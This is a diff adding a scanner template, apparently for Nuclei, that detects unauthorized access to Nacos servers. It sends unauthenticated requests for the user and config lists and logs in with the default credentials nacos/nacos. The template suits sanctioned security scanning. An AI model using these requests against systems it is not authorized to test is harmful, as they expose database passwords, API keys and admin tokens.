@@ -1,0 +1,67 @@
+id: nacos-unauthorized-access
+
+info:
+  name: Nacos - Unauthorized Access (未授权访问)
+  author: bai-codeagent
+  severity: critical
+  description: |
+    Nacos 配置中心/注册中心存在未授权访问漏洞。
+    攻击者可直接访问配置信息，获取数据库密码、API密钥等敏感信息。
+    默认口令: nacos/nacos
+  reference:
+    - https://github.com/alibaba/nacos
+  tags: nacos,unauth,cn-cms
+  metadata:
+    cnvd-applicable: true
+    default-credentials: nacos/nacos
+
+requests:
+  # 未授权获取用户列表
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"username"'
+          - '"pageItems"'
+        condition: and
+      - type: status
+        status:
+          - 200
+
+  # 未授权获取配置列表
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&search=accurate"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"totalCount"'
+          - '"pageItems"'
+        condition: and
+      - type: status
+        status:
+          - 200
+
+  # 默认密码登录
+  - raw:
+      - |
+        POST {{BaseURL}}/nacos/v1/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=nacos&password=nacos
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"accessToken"'
+          - '"tokenTtl"'
+        condition: and
+      - type: status
+        status:
+          - 200
